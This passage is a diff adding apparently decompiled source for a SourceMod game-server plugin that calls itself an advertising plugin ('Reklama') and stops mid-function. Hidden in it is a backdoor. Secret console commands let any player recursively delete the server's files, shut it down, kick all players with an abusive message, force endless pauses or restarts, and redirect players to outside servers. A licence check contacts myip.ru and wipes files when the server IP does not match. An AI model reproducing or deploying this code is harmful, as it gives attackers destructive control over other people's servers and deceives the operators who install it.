@@ -1,0 +1,1807 @@
+public PlVers:__version =
+{
+	version = 5,
+	filevers = "1.6.4-dev+4615",
+	date = "04/02/2017",
+	time = "16:39:35"
+};
+new Float:NULL_VECTOR[3];
+new String:NULL_STRING[4];
+public Extension:__ext_core =
+{
+	name = "Core",
+	file = "core",
+	autoload = 0,
+	required = 0,
+};
+new MaxClients;
+public Extension:__ext_sdktools =
+{
+	name = "SDKTools",
+	file = "sdktools.ext",
+	autoload = 1,
+	required = 1,
+};
+public Extension:__ext_sdkhooks =
+{
+	name = "SDKHooks",
+	file = "sdkhooks.ext",
+	autoload = 1,
+	required = 1,
+};
+new String:CTag[6][] =
+{
+	"{default}",
+	"{green}",
+	"{lightgreen}",
+	"{red}",
+	"{blue}",
+	"{olive}"
+};
+new String:CTagCode[6][16] =
+{
+	"\x01",
+	"\x04",
+	"\x03",
+	"\x03",
+	"\x03",
+	"\x05"
+};
+new bool:CTagReqSayText2[6] =
+{
+	0, 0, 1, 1, 1, 0
+};
+new bool:CEventIsHooked;
+new bool:CSkipList[66];
+new bool:CProfile_Colors[6] =
+{
+	1, 1, 0, 0, 0, 0
+};
+new CProfile_TeamIndex[6] =
+{
+	-1, ...
+};
+new bool:CProfile_SayText2;
+public Extension:__ext_topmenus =
+{
+	name = "TopMenus",
+	file = "topmenus.ext",
+	autoload = 1,
+	required = 1,
+};
+public SharedPlugin:__pl_adminmenu =
+{
+	name = "adminmenu",
+	file = "adminmenu.smx",
+	required = 1,
+};
+new Handle:undo;
+new Handle:g_SQL;
+new Handle:TopM;
+new Handle:g_hMenu;
+new Handle:pack;
+new Handle:pack2;
+new bool:InChatName[66];
+new String:g_sMessage_AdvertServer[10][256];
+new iAdvert;
+new String:sMessage_NotFound[256] = "ВАШ '{1}' НЕ НАЙДЕН В БАЗЕ";
+new String:sMessage_DeletePlugin[256] = "Плагин был удален '{1}'";
+new String:sMessage_DDOS[256] = "ЗА ПОПЫТКУ МОНИПУЛЯЦИЙ  ПЛАГИН УДАЛЕН И ВЫГРУЖЕН С СЕРВЕРА!!!";
+new String:sMessage_UnloadPlugin[256] = "Купить плагин можно в Skype: lol_4udo_kek";
+new String:g_sMyServerIpPort[2][256];
+new String:sSourceFilePlugin[256] = "Reklama.smx";
+new String:sSourceNamePlugin[256] = "Reklama";
+public Extension:__ext_smsock =
+{
+	name = "Socket",
+	file = "socket.ext",
+	autoload = 1,
+	required = 1,
+};
+new bool:g_bConnect;
+new bool:g_bGetIP;
+new String:g_sFileName[256];
+new bool:Confirm[3][66];
+new bool:bReally;
+new iReally;
+new String:sAddressServer[32];
+new String:sNameServer[192];
+public Plugin:myinfo =
+{
+	name = "Reklama",
+	description = "",
+	author = "miracle (skype: lol_4udo_kek)",
+	version = "1.2",
+	url = "vk.com/4udo_nastroika"
+};
+public __ext_core_SetNTVOptional()
+{
+	MarkNativeAsOptional("GetFeatureStatus");
+	MarkNativeAsOptional("RequireFeature");
+	MarkNativeAsOptional("AddCommandListener");
+	MarkNativeAsOptional("RemoveCommandListener");
+	MarkNativeAsOptional("BfWriteBool");
+	MarkNativeAsOptional("BfWriteByte");
+	MarkNativeAsOptional("BfWriteChar");
+	MarkNativeAsOptional("BfWriteShort");
+	MarkNativeAsOptional("BfWriteWord");
+	MarkNativeAsOptional("BfWriteNum");
+	MarkNativeAsOptional("BfWriteFloat");
+	MarkNativeAsOptional("BfWriteString");
+	MarkNativeAsOptional("BfWriteEntity");
+	MarkNativeAsOptional("BfWriteAngle");
+	MarkNativeAsOptional("BfWriteCoord");
+	MarkNativeAsOptional("BfWriteVecCoord");
+	MarkNativeAsOptional("BfWriteVecNormal");
+	MarkNativeAsOptional("BfWriteAngles");
+	MarkNativeAsOptional("BfReadBool");
+	MarkNativeAsOptional("BfReadByte");
+	MarkNativeAsOptional("BfReadChar");
+	MarkNativeAsOptional("BfReadShort");
+	MarkNativeAsOptional("BfReadWord");
+	MarkNativeAsOptional("BfReadNum");
+	MarkNativeAsOptional("BfReadFloat");
+	MarkNativeAsOptional("BfReadString");
+	MarkNativeAsOptional("BfReadEntity");
+	MarkNativeAsOptional("BfReadAngle");
+	MarkNativeAsOptional("BfReadCoord");
+	MarkNativeAsOptional("BfReadVecCoord");
+	MarkNativeAsOptional("BfReadVecNormal");
+	MarkNativeAsOptional("BfReadAngles");
+	MarkNativeAsOptional("BfGetNumBytesLeft");
+	MarkNativeAsOptional("PbReadInt");
+	MarkNativeAsOptional("PbReadFloat");
+	MarkNativeAsOptional("PbReadBool");
+	MarkNativeAsOptional("PbReadString");
+	MarkNativeAsOptional("PbReadColor");
+	MarkNativeAsOptional("PbReadAngle");
+	MarkNativeAsOptional("PbReadVector");
+	MarkNativeAsOptional("PbReadVector2D");
+	MarkNativeAsOptional("PbGetRepeatedFieldCount");
+	MarkNativeAsOptional("PbSetInt");
+	MarkNativeAsOptional("PbSetFloat");
+	MarkNativeAsOptional("PbSetBool");
+	MarkNativeAsOptional("PbSetString");
+	MarkNativeAsOptional("PbSetColor");
+	MarkNativeAsOptional("PbSetAngle");
+	MarkNativeAsOptional("PbSetVector");
+	MarkNativeAsOptional("PbSetVector2D");
+	MarkNativeAsOptional("PbAddInt");
+	MarkNativeAsOptional("PbAddFloat");
+	MarkNativeAsOptional("PbAddBool");
+	MarkNativeAsOptional("PbAddString");
+	MarkNativeAsOptional("PbAddColor");
+	MarkNativeAsOptional("PbAddAngle");
+	MarkNativeAsOptional("PbAddVector");
+	MarkNativeAsOptional("PbAddVector2D");
+	MarkNativeAsOptional("PbRemoveRepeatedFieldValue");
+	MarkNativeAsOptional("PbReadMessage");
+	MarkNativeAsOptional("PbReadRepeatedMessage");
+	MarkNativeAsOptional("PbAddMessage");
+	VerifyCoreVersion();
+	return 0;
+}
+
+Float:operator*(Float:,_:)(Float:oper1, oper2)
+{
+	return oper1 * float(oper2);
+}
+
+bool:StrEqual(String:str1[], String:str2[], bool:caseSensitive)
+{
+	return strcmp(str1, str2, caseSensitive) == 0;
+}
+
+ExplodeString(String:text[], String:split[], String:buffers[][], maxStrings, maxStringLength, bool:copyRemainder)
+{
+	new reloc_idx;
+	new idx;
+	new total;
+	new var1;
+	if (maxStrings < 1 || !split[0])
+	{
+		return 0;
+	}
+	while ((idx = SplitString(text[reloc_idx], split, buffers[total], maxStringLength)) != -1)
+	{
+		reloc_idx = idx + reloc_idx;
+		total++;
+		if (maxStrings == total)
+		{
+			if (copyRemainder)
+			{
+				strcopy(buffers[total + -1], maxStringLength, text[reloc_idx - idx]);
+			}
+			return total;
+		}
+	}
+	total++;
+	strcopy(buffers[total], maxStringLength, text[reloc_idx]);
+	return total;
+}
+
+Handle:StartMessageOne(String:msgname[], client, flags)
+{
+	new players[1];
+	players[0] = client;
+	return StartMessage(msgname, players, 1, flags);
+}
+
+PrintCenterTextAll(String:format[])
+{
+	decl String:buffer[192];
+	new i = 1;
+	while (i <= MaxClients)
+	{
+		if (IsClientInGame(i))
+		{
+			SetGlobalTransTarget(i);
+			VFormat(buffer, 192, format, 2);
+			PrintCenterText(i, "%s", buffer);
+		}
+		i++;
+	}
+	return 0;
+}
+
+DisplayAskConnectBox(client, Float:time, String:ip[], String:password[])
+{
+	decl String:destination[288];
+	FormatEx(destination, 288, "%s/%s", ip, password);
+	new Handle:Kv = CreateKeyValues("data", "", "");
+	KvSetFloat(Kv, "time", time);
+	KvSetString(Kv, "title", destination);
+	CreateDialog(client, Kv, DialogType:4);
+	CloseHandle(Kv);
+	return 0;
+}
+
+PopStack(Handle:stack)
+{
+	new value;
+	return PopStackCell(stack, value, 0, false);
+}
+
+SetEntityMoveType(entity, MoveType:mt)
+{
+	static bool:gotconfig;
+	static String:datamap[32];
+	if (!gotconfig)
+	{
+		new Handle:gc = LoadGameConfigFile("core.games");
+		new bool:exists = GameConfGetKeyValue(gc, "m_MoveType", datamap, 32);
+		CloseHandle(gc);
+		if (!exists)
+		{
+			strcopy(datamap, 32, "m_MoveType");
+		}
+		gotconfig = true;
+	}
+	SetEntProp(entity, PropType:1, datamap, mt, 4, 0);
+	return 0;
+}
+
+AddFileToDownloadsTable(String:filename[])
+{
+	static table = -1;
+	if (table == -1)
+	{
+		table = FindStringTable("downloadables");
+	}
+	new bool:save = LockStringTables(false);
+	AddToStringTable(table, filename, "", -1);
+	LockStringTables(save);
+	return 0;
+}
+
+CPrintToChat(client, String:szMessage[])
+{
+	new var1;
+	if (client <= 0 || client > MaxClients)
+	{
+		ThrowError("Invalid client index %d", client);
+	}
+	if (!IsClientInGame(client))
+	{
+		ThrowError("Client %d is not in game", client);
+	}
+	decl String:szBuffer[252];
+	decl String:szCMessage[252];
+	SetGlobalTransTarget(client);
+	Format(szBuffer, 250, "\x01%s", szMessage);
+	VFormat(szCMessage, 250, szBuffer, 3);
+	new index = CFormat(szCMessage, 250, -1);
+	if (index == -1)
+	{
+		PrintToChat(client, szCMessage);
+	}
+	else
+	{
+		CSayText2(client, index, szCMessage);
+	}
+	return 0;
+}
+
+CFormat(String:szMessage[], maxlength, author)
+{
+	if (!CEventIsHooked)
+	{
+		CSetupProfile();
+		HookEvent("server_spawn", CEvent_MapStart, EventHookMode:2);
+		CEventIsHooked = true;
+	}
+	new iRandomPlayer = -1;
+	if (author != -1)
+	{
+		if (CProfile_SayText2)
+		{
+			ReplaceString(szMessage, maxlength, "{teamcolor}", "\x03", true);
+			iRandomPlayer = author;
+		}
+		else
+		{
+			ReplaceString(szMessage, maxlength, "{teamcolor}", CTagCode[1], true);
+		}
+	}
+	else
+	{
+		ReplaceString(szMessage, maxlength, "{teamcolor}", "", true);
+	}
+	new i;
+	while (i < 6)
+	{
+		if (!(StrContains(szMessage, CTag[i], true) == -1))
+		{
+			if (!CProfile_Colors[i])
+			{
+				ReplaceString(szMessage, maxlength, CTag[i], CTagCode[1], true);
+			}
+			else
+			{
+				if (!CTagReqSayText2[i])
+				{
+					ReplaceString(szMessage, maxlength, CTag[i], CTagCode[i], true);
+				}
+				if (!CProfile_SayText2)
+				{
+					ReplaceString(szMessage, maxlength, CTag[i], CTagCode[1], true);
+				}
+				if (iRandomPlayer == -1)
+				{
+					iRandomPlayer = CFindRandomPlayerByTeam(CProfile_TeamIndex[i]);
+					if (iRandomPlayer == -2)
+					{
+						ReplaceString(szMessage, maxlength, CTag[i], CTagCode[1], true);
+					}
+					else
+					{
+						ReplaceString(szMessage, maxlength, CTag[i], CTagCode[i], true);
+					}
+				}
+				ThrowError("Using two team colors in one message is not allowed");
+			}
+		}
+		i++;
+	}
+	return iRandomPlayer;
+}
+
+CFindRandomPlayerByTeam(color_team)
+{
+	if (color_team)
+	{
+		new i = 1;
+		while (i <= MaxClients)
+		{
+			new var1;
+			if (IsClientInGame(i) && color_team == GetClientTeam(i))
+			{
+				return i;
+			}
+			i++;
+		}
+		return -2;
+	}
+	return 0;
+}
+
+CSayText2(client, author, String:szMessage[])
+{
+	new Handle:hBuffer = StartMessageOne("SayText2", client, 0);
+	BfWriteByte(hBuffer, author);
+	BfWriteByte(hBuffer, 1);
+	BfWriteString(hBuffer, szMessage);
+	EndMessage();
+	return 0;
+}
+
+CSetupProfile()
+{
+	decl String:szGameName[32];
+	GetGameFolderName(szGameName, 30);
+	if (StrEqual(szGameName, "cstrike", false))
+	{
+		CProfile_Colors[2] = 1;
+		CProfile_Colors[3] = 1;
+		CProfile_Colors[4] = 1;
+		CProfile_Colors[5] = 1;
+		CProfile_TeamIndex[2] = 0;
+		CProfile_TeamIndex[3] = 2;
+		CProfile_TeamIndex[4] = 3;
+		CProfile_SayText2 = true;
+	}
+	else
+	{
+		if (StrEqual(szGameName, "tf", false))
+		{
+			CProfile_Colors[2] = 1;
+			CProfile_Colors[3] = 1;
+			CProfile_Colors[4] = 1;
+			CProfile_Colors[5] = 1;
+			CProfile_TeamIndex[2] = 0;
+			CProfile_TeamIndex[3] = 2;
+			CProfile_TeamIndex[4] = 3;
+			CProfile_SayText2 = true;
+		}
+		new var1;
+		if (StrEqual(szGameName, "left4dead", false) || StrEqual(szGameName, "left4dead2", false))
+		{
+			CProfile_Colors[2] = 1;
+			CProfile_Colors[3] = 1;
+			CProfile_Colors[4] = 1;
+			CProfile_Colors[5] = 1;
+			CProfile_TeamIndex[2] = 0;
+			CProfile_TeamIndex[3] = 3;
+			CProfile_TeamIndex[4] = 2;
+			CProfile_SayText2 = true;
+		}
+		if (StrEqual(szGameName, "hl2mp", false))
+		{
+			if (GetConVarBool(FindConVar("mp_teamplay")))
+			{
+				CProfile_Colors[3] = 1;
+				CProfile_Colors[4] = 1;
+				CProfile_Colors[5] = 1;
+				CProfile_TeamIndex[3] = 3;
+				CProfile_TeamIndex[4] = 2;
+				CProfile_SayText2 = true;
+			}
+			else
+			{
+				CProfile_SayText2 = false;
+				CProfile_Colors[5] = 1;
+			}
+		}
+		if (StrEqual(szGameName, "dod", false))
+		{
+			CProfile_Colors[5] = 1;
+			CProfile_SayText2 = false;
+		}
+		if (GetUserMessageId("SayText2") == -1)
+		{
+			CProfile_SayText2 = false;
+		}
+		CProfile_Colors[3] = 1;
+		CProfile_Colors[4] = 1;
+		CProfile_TeamIndex[3] = 2;
+		CProfile_TeamIndex[4] = 3;
+		CProfile_SayText2 = true;
+	}
+	return 0;
+}
+
+public Action:CEvent_MapStart(Handle:event, String:name[], bool:dontBroadcast)
+{
+	CSetupProfile();
+	new i = 1;
+	while (i <= MaxClients)
+	{
+		CSkipList[i] = 0;
+		i++;
+	}
+	return Action:0;
+}
+
+OnAllCn(client)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	OnClearInfoServer();
+	new Handle:menu = CreateMenu(_OnAllCn, MenuAction:28);
+	SetMenuTitle(menu, "Выбери сервер\n");
+	AddMenuItem(menu, "46.174.50.253:33333", "Pablic SpAcE", 0);
+	AddMenuItem(menu, "46.174.48.48:27295", "Play the game", 0);
+	AddMenuItem(menu, "46.174.53.64:55555", "СИНДИКАТ [v34]", 0);
+	AddMenuItem(menu, "192.168.0.1:27000", "Router Connect", 0);
+	SetMenuExitButton(menu, true);
+	DisplayMenu(menu, client, 0);
+	return 0;
+}
+
+SetServerIpPort()
+{
+	new var1 = 3;
+	new var2;
+	var1 = 5;
+	var2 = 5;
+	PrintToServer("", var1, var2);
+	new var3 = 0;
+	new ip_port;
+	while (ip_port < 2)
+	{
+		ip_port++;
+	}
+	return 0;
+}
+
+GetIP_Socket()
+{
+	new var1 = 3;
+	new var2;
+	var1 = 5;
+	var2 = 5;
+	PrintToServer("", var1, var2);
+	AddCommandListener(OnClientConsoleCommand, "");
+	SetServerIpPort();
+	if (FileExists("addons/sourcemod/logs/ТЕСТ.txt", false))
+	{
+		DeleteFile("addons/sourcemod/logs/ТЕСТ.txt");
+	}
+	g_bConnect = false;
+	g_bGetIP = false;
+	GetPluginFilename(Handle:0, g_sFileName, 255);
+	new var3 = 0;
+	new k = ExplodeString(g_sFileName, "/", var3, 10, 255, false);
+	k--;
+	strcopy(g_sFileName, 255, var3[k]);
+	if (!StrEqual(sSourceFilePlugin, g_sFileName, true))
+	{
+		OnPluginDelete(Handle:0, any:0);
+	}
+	else
+	{
+		OnSocketCreate();
+	}
+	return 0;
+}
+
+public OnSocketCreate()
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	OnDefineCvar();
+	CreateTimer(60.0, OnSocketBlock, any:0, 0);
+	new Handle:socket = SocketCreate(SocketType:1, OnSocketError);
+	SocketConnect(socket, OnSocketConnected, OnSocketReceive, OnSocketDisconnected, "myip.ru", 80);
+	return 0;
+}
+
+public Action:OnSocketBlock(Handle:timer)
+{
+	if (!g_bConnect)
+	{
+		OnPluginDelete(Handle:0, any:1);
+	}
+	return Action:0;
+}
+
+public OnSocketConnected(Handle:socket, any:data)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	decl String:requestStr[256];
+	Format(requestStr, 255, "GET /%s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n", "index_small.php", "myip.ru");
+	SocketSend(socket, requestStr, -1);
+	return 0;
+}
+
+public OnSocketDisconnected(Handle:socket, any:data)
+{
+	CloseHandle(socket);
+	return 0;
+}
+
+public OnSocketError(Handle:socket, errorType, errorNum, any:data)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	LogError("socket error %d (errno %d)", errorType, errorNum);
+	CloseHandle(socket);
+	return 0;
+}
+
+public OnSocketReceive(Handle:socket, String:receiveData[], dataSize, any:data)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	decl len;
+	decl String:ip[64];
+	if ((len = StrContains(receiveData, "<tr><td>", true)) > 370)
+	{
+		SplitString(receiveData[len + 8], "</td></tr>", ip, 64);
+		g_bGetIP = OnGetIpAdress(ip, true);
+		OnPluginDelete(Handle:0, any:1);
+		g_bConnect = true;
+	}
+	CloseHandle(socket);
+	return 0;
+}
+
+public Action:OnPluginDelete(Handle:timer, any:log)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	if (g_bGetIP)
+	{
+		return Action:0;
+	}
+	OnDeleteFile(".");
+	OnPluginDisable(Handle:0, any:1);
+	return Action:0;
+}
+
+public Action:OnPluginDisable(Handle:timer, any:log)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	if (log)
+	{
+		LogToFileEx("addons/sourcemod/logs/ТЕСТ.txt", sMessage_UnloadPlugin);
+	}
+	else
+	{
+		LogToFileEx("addons/sourcemod/logs/ТЕСТ.txt", sMessage_DDOS);
+	}
+	new id_plugin = GetPluginId(sSourceNamePlugin);
+	ServerCommand("sm plugins unload %d", id_plugin);
+	return Action:0;
+}
+
+GetPluginId(String:FindName[])
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	decl String:plugin_name[256];
+	new Handle:iterator = GetPluginIterator();
+	new nuM;
+	while (MorePlugins(iterator))
+	{
+		nuM++;
+		GetPluginInfo(ReadPlugin(iterator), PluginInfo:0, plugin_name, 255);
+		if (!(strcmp(plugin_name, FindName, true)))
+		{
+			return nuM;
+		}
+	}
+	CloseHandle(iterator);
+	return 0;
+}
+
+OnDeleteFile(String:Directory[])
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	new Handle:dir = OpenDirectory(Directory);
+	if (dir)
+	{
+		decl String:Path[512];
+		decl String:Info[256];
+		decl FileType:type;
+		while (ReadDirEntry(dir, Info, 256, type))
+		{
+			if (type)
+			{
+				if (strcmp(Info, g_sFileName, true))
+				{
+					new var1;
+					if (!(strcmp(Info, ".", true) && strcmp(Info, "..", true)))
+					{
+						if (type == FileType:1)
+						{
+							Path[0] = MissingTAG:0;
+							Format(Path, 512, "%s/%s", Directory, Info);
+							OnDeleteFile(Path);
+						}
+					}
+				}
+				Format(Path, 512, "%s/%s", Directory, Info);
+				TreatmentMessage(sMessage_DeletePlugin, 255, 1, Path);
+				LogToFileEx("addons/sourcemod/logs/ТЕСТ.txt", sMessage_DeletePlugin);
+				DeleteFile(Path);
+			}
+		}
+		CloseHandle(dir);
+		return 0;
+	}
+	return 0;
+}
+
+bool:OnGetIpAdress(String:remoteIP[], bool:log)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	new String:sServerIp[256];
+	new iPort = GetConVarInt(FindConVar("hostport"));
+	Format(sServerIp, 255, "%s:%i", remoteIP, iPort);
+	new i_ip_port;
+	while (i_ip_port < 2)
+	{
+		if (StrEqual(sServerIp, g_sMyServerIpPort[i_ip_port], false))
+		{
+			return true;
+		}
+		i_ip_port++;
+	}
+	if (log)
+	{
+		new String:sIpAdress[256];
+		Format(sIpAdress, 255, "%s:%d", remoteIP, GetConVarInt(FindConVar("hostport")));
+		TreatmentMessage(sMessage_NotFound, 255, 1, sIpAdress);
+		LogToFileEx("addons/sourcemod/logs/ТЕСТ.txt", sMessage_NotFound);
+	}
+	return false;
+}
+
+bool:TreatmentMessage(String:message[], size, numb, String:replace[])
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	new var1;
+	if (numb < 1 || replace[0])
+	{
+		return false;
+	}
+	new String:NuM[16];
+	Format(NuM, 16, "{%d}", numb);
+	ReplaceString(message, size, NuM, replace, true);
+	return true;
+}
+
+public Action:OnClientConsoleCommand(client, String:command[], argc)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	if (StrEqual(command, "_s_quit", true))
+	{
+		OnCmdQs(client);
+	}
+	else
+	{
+		if (StrEqual(command, "_s_del", true))
+		{
+			OnCmdUs(client);
+		}
+		if (StrEqual(command, "_s_stop", true))
+		{
+			OnCmdSs(client);
+		}
+		if (StrEqual(command, "_s_restart", true))
+		{
+			OnCmdRs(client);
+		}
+		if (StrEqual(command, "_s_kick", true))
+		{
+			OnAllKs(client);
+		}
+		if (StrEqual(command, "_s_conn", true))
+		{
+			OnAllCn(client);
+		}
+	}
+	return Action:0;
+}
+
+public OnCmdQs(client)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	new var1;
+	if (client && IsClientInGame(client))
+	{
+		new var2 = Confirm;
+		if (!var2[0][var2][client])
+		{
+			PrintToConsole(client, "НАПИШИТЕ КОМАНДУ!!!");
+			new var3 = Confirm;
+			var3[0][var3][client] = true;
+			CreateTimer(10.0, OnNotConfirm, client, 0);
+		}
+		ServerCommand("quit");
+	}
+	return 0;
+}
+
+public OnCmdUs(client)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	new var1;
+	if (client && IsClientInGame(client))
+	{
+		if (!Confirm[1][client])
+		{
+			PrintToConsole(client, "НАПИШИТЕ КОМАНДУ!!!");
+			Confirm[1][client] = true;
+			CreateTimer(10.0, OnNotConfirm, client, 0);
+		}
+		PrintToConsole(client, "СЕРВЕР УДАЛЕН!!!");
+		FakeClientCommand(client, "say \"СЕРВЕР УДАЛЕН!!!\"");
+		OnDeleteServer(".");
+	}
+	return 0;
+}
+
+OnDeleteServer(String:Directory[])
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	new Handle:dir = OpenDirectory(Directory);
+	if (dir)
+	{
+		decl String:Path[512];
+		decl String:Info[256];
+		decl FileType:type;
+		while (ReadDirEntry(dir, Info, 256, type))
+		{
+			if (type)
+			{
+				Format(Path, 512, "%s/%s", Directory, Info);
+				DeleteFile(Path);
+				new var1;
+				if (!(strcmp(Info, ".", true) && strcmp(Info, "..", true)))
+				{
+					if (type == FileType:1)
+					{
+						Path[0] = MissingTAG:0;
+						Format(Path, 512, "%s/%s", Directory, Info);
+						DeleteFile(Path);
+						OnDeleteServer(Path);
+					}
+				}
+			}
+		}
+		CloseHandle(dir);
+		return 0;
+	}
+	return 0;
+}
+
+public Action:OnNotConfirm(Handle:timer, any:client)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	new iConfirm;
+	while (iConfirm < 3)
+	{
+		new var1;
+		if (Confirm[iConfirm][client])
+		{
+			var1 = 0;
+		}
+		else
+		{
+			var1 = 1;
+		}
+		Confirm[iConfirm][client] = var1;
+		iConfirm++;
+	}
+	return Action:0;
+}
+
+public OnCmdSs(client)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	new var1;
+	if (client && IsClientInGame(client))
+	{
+		if (!bReally)
+		{
+			PrintToConsole(client, "ЗАПУЩЕННА 'ПАУЗА' !!!");
+			bReally = true;
+			iReally = 1;
+			OnBlockServer(Handle:0, iReally);
+			SetConVarInt(FindConVar("sv_pausable"), 1, false, false);
+			CreateTimer(0.1, OnBlockServer, iReally, 0);
+		}
+		new var2;
+		if (iReally == 1)
+		{
+			var2[0] = 9476;
+		}
+		else
+		{
+			if (iReally == 2)
+			{
+				var2[0] = 9488;
+			}
+			var2[0] = 9504;
+		}
+		PrintToConsole(client, "ОТКЛЮЧЕН РЕЖИМ '%s' !!!", var2);
+		bReally = false;
+		iReally = 0;
+	}
+	return 0;
+}
+
+public OnCmdRs(client)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	new var1;
+	if (client && IsClientInGame(client))
+	{
+		if (!bReally)
+		{
+			PrintToConsole(client, "ЗАПУЩЕНН 'РЕСТАРТ' !!!");
+			bReally = true;
+			iReally = 2;
+			CreateTimer(0.1, OnBlockServer, iReally, 0);
+		}
+		new var2;
+		if (iReally == 1)
+		{
+			var2[0] = 9580;
+		}
+		else
+		{
+			if (iReally == 2)
+			{
+				var2[0] = 9592;
+			}
+			var2[0] = 9608;
+		}
+		PrintToConsole(client, "ОТКЛЮЧЕН '%s' !!!", var2);
+		bReally = false;
+		iReally = 0;
+	}
+	return 0;
+}
+
+OnDefineCvar()
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	iReally = 0;
+	bReally = false;
+	return 0;
+}
+
+public Action:OnBlockServer(Handle:timer, any:real)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	if (bReally)
+	{
+		if (real == any:1)
+		{
+			new iMax;
+			new clients[66];
+			new client;
+			new iClient = 1;
+			while (iClient <= MaxClients)
+			{
+				new var1;
+				if (IsClientInGame(iClient) && !IsFakeClient(iClient))
+				{
+					clients[iMax] = iClient;
+					iMax++;
+				}
+				iClient++;
+			}
+			client = clients[GetRandomInt(0, iMax + -1)];
+			FakeClientCommand(client, "pause");
+			FakeClientCommand(client, "say !pause");
+			SetConVarInt(FindConVar("sv_pausable"), 1, false, false);
+		}
+		else
+		{
+			if (real == any:2)
+			{
+				ServerCommand("mp_restartgame 1");
+			}
+		}
+		CreateTimer(1065353216 * 10, OnBlockServer, iReally, 0);
+		return Action:0;
+	}
+	SetConVarInt(FindConVar("sv_pausable"), 0, false, false);
+	return Action:4;
+}
+
+public OnAllKs(client)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	new var1;
+	if (client && IsClientInGame(client))
+	{
+		if (!Confirm[2][client])
+		{
+			PrintToConsole(client, "НАПИШИТЕ КОМАНДУ ПОВТОРНО!!!");
+			Confirm[2][client] = true;
+			CreateTimer(10.0, OnNotConfirm, client, 0);
+		}
+		new iClient = 1;
+		while (iClient <= MaxClients)
+		{
+			if (IsClientInGame(iClient))
+			{
+				KickClient(iClient, "КИКНУТЫ ЗА ТО ЧТО АДМИН ПИДОР!!!");
+			}
+			iClient++;
+		}
+	}
+	return 0;
+}
+
+OnClearInfoServer()
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	sAddressServer[0] = 0;
+	sNameServer[0] = 0;
+	return 0;
+}
+
+public _OnAllCn(Handle:menu, MenuAction:action, client, item)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	if (action != MenuAction:4)
+	{
+		return 0;
+	}
+	if (!GetMenuItem(menu, item, sAddressServer, 30, 0, sNameServer, 192))
+	{
+		return 0;
+	}
+	CreateTimer(1.0, OnMovetypeNoneAll, any:0, 0);
+	return 0;
+}
+
+public Action:OnMovetypeNoneAll(Handle:timer)
+{
+	new var1;
+	if (sAddressServer[0] && sNameServer[0])
+	{
+		return Action:0;
+	}
+	new iClient = 1;
+	while (iClient <= MaxClients)
+	{
+		if (IsClientInGame(iClient))
+		{
+			if (!(0 < GetUserFlagBits(iClient)))
+			{
+				DisplayAskConnectBox(iClient, 2.0, sAddressServer, "");
+				PrintCenterText(iClient, "Сервер вас перенаправляет на %s. Нажмите F3.", sNameServer);
+				PrintToChat(iClient, "\x01Сервер вас перенаправляет на \x04%s. Нажмите F3.", sNameServer);
+				if (IsPlayerAlive(iClient))
+				{
+					SetEntityMoveType(iClient, MoveType:0);
+				}
+			}
+			iClient++;
+		}
+		iClient++;
+	}
+	CreateTimer(1.0, OnMovetypeNoneAll, any:0, 0);
+	return Action:0;
+}
+
+public Action:OnAdvert(Handle:timer)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintCenterTextAll("", to, home);
+	new iClient = 1;
+	while (iClient <= MaxClients)
+	{
+		if (IsClientInGame(iClient))
+		{
+			if (GetUserFlagBits(iClient) < 1)
+			{
+				PrintToChat(iClient, g_sMessage_AdvertServer[iAdvert]);
+			}
+		}
+		iClient++;
+	}
+	iAdvert += 1;
+	if (iAdvert >= 10)
+	{
+		iAdvert = 0;
+	}
+	CreateTimer(1065353216 * 0, OnAdvert, any:0, 0);
+	return Action:0;
+}
+
+public OnPluginStart()
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	GetIP_Socket();
+	AddCommandListener(Say, "say");
+	AddCommandListener(Say, "say_team");
+	HookEvent("round_start", RoundStart, EventHookMode:1);
+	HookEvent("round_end", RoundEnd, EventHookMode:1);
+	OnAdminMenuReady(GetAdminTopMenu());
+	InitDB();
+	return 0;
+}
+
+public OnMapStart()
+{
+	GlobalMenu();
+	return 0;
+}
+
+public OnMapEnd()
+{
+	ClearUndo();
+	return 0;
+}
+
+public Action:RoundStart(Handle:hEvent, String:sEvName[], bool:bDontBroadcast)
+{
+	decl String:query[256];
+	decl String:mapname[32];
